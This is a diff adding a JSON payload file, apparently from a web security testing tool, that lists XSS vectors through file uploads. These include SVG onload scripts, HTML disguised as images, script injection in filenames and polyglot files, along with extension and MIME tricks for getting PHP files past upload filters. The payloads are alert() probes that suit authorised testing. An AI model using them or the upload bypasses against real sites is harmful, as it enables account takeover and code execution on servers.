@@ -1,0 +1,60 @@
+{
+  "type": "xss_file_upload",
+  "description": "XSS via file upload vectors. When uploaded files are served back to users/admins.",
+  "vectors": {
+    "svg_xss": {
+      "description": "SVG files can contain JavaScript. Served with image/svg+xml MIME type, browser executes JS.",
+      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\"/>\n</svg>",
+      "filename": "argus_test.svg",
+      "mime_type": "image/svg+xml",
+      "conditions": "Server must serve file with SVG content-type (or without Content-Type header)"
+    },
+    "html_as_image": {
+      "description": "Upload HTML file disguised as image. If server serves it as text/html, XSS executes.",
+      "payload": "<script>alert(document.domain)</script>",
+      "filename": "image.png",
+      "technique": "Change filename to .png but keep HTML content; some servers use content detection over extension"
+    },
+    "xss_in_filename": {
+      "description": "Filename reflected in page (e.g., 'Upload successful: FILENAME')",
+      "payloads": [
+        "\"><script>alert(1)</script>.png",
+        "' onmouseover='alert(1)' '.png",
+        "<img src=x onerror=alert(1)>.png"
+      ]
+    },
+    "pdf_xss": {
+      "description": "PDF with JavaScript can execute in browser PDF viewer",
+      "note": "Modern browsers sandbox PDF JS — reduced impact but worth testing"
+    },
+    "xml_based": {
+      "description": "SVG/XML variants that execute in older/less strict contexts",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"javascript:alert(1)\">]>\n<foo>&xxe;</foo>"
+    },
+    "polyglot": {
+      "description": "File that is valid image AND valid HTML/JS (bypass content-type detection)",
+      "technique": "GIF89a with appended HTML: GIF header + HTML/JS payload. Parsed as GIF by magic bytes check but executed as HTML by browser."
+    }
+  },
+  "bypass_techniques": {
+    "extension_bypass": [
+      ".php.jpg",
+      ".php%00.jpg",
+      ".php5",
+      ".phtml",
+      ".PhP",
+      "file.php.",
+      "file.php ",
+      "file.php/."
+    ],
+    "mime_bypass": [
+      "Change Content-Type: image/jpeg while uploading .php",
+      "Add magic bytes: \\xff\\xd8\\xff before PHP code",
+      "Double extension: file.jpg.php"
+    ],
+    "content_disposition": [
+      "Try serving uploaded files with no Content-Disposition header",
+      "If admin views uploads inline rather than downloading, XSS can execute"
+    ]
+  }
+}
